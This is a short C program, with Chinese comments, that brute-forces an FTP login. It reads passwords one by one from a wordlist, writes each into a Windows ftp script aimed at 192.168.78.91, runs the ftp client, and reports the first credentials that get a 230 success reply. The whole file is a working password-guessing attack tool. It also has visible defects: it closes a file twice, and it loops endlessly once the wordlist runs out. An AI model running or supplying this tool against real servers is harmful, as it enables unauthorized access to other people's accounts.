#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{


    //1、打开密码库文件
    FILE * fp1 = fopen("D:/passwd.txt","r");

    if(!fp1)
    {
        printf("open file error\n");
        return -1;
    }


    //2、生成一个密钥文件
    /*open 192.168.78.91
     * user
     * user
     * 123456
     * bye
     */
    char buf[1024];
    //ip地址
    char * ip = "192.168.78.91";
    //用户名
    char * user = "user";
    //读密码库文件
    char passwd[100];
    while(1)
    {

        FILE * fp2 = fopen("D:/a.txt","w");
        if(!fp2)
        {
            printf("file open error\n");
            return -1;
        }
        memset(passwd,0,100);
        fgets(passwd,100,fp1);
        memset(buf,0,1024);
        //生成密钥文件字符串
        sprintf(buf,"open %s\nuser\n%s\n%sbye",ip,user,passwd);

        fputs(buf,fp2);
        //更新缓冲区
        //fflush(fp2);

        //关闭文件
        fclose(fp2);

         //3、验证密钥文件

        FILE * fp3 = _popen("ftp -n -s:D:/a.txt","r");
        if(!fp3)
        {
            printf("open cmd error");
            return -2;
        }

        char content[1024];
        while(!feof(fp3))
        {
            memset(content,0,1024);
            fgets(content,1024,fp3);
            //4、成功（230）程序停止
            //5、失败(530)程序继续
            if(!strncmp(content,"230",3))
            {
                printf("ip:%s\n",ip);
                printf("user:%s\n",user);
                printf("passwd:%s",passwd);
                printf("keyfile:D:/a.txt");


                fclose(fp1);
                fclose(fp2);

                return 0;
            }
            printf("%s",content);
        }
    }
    fclose(fp1);
    return -3;
}

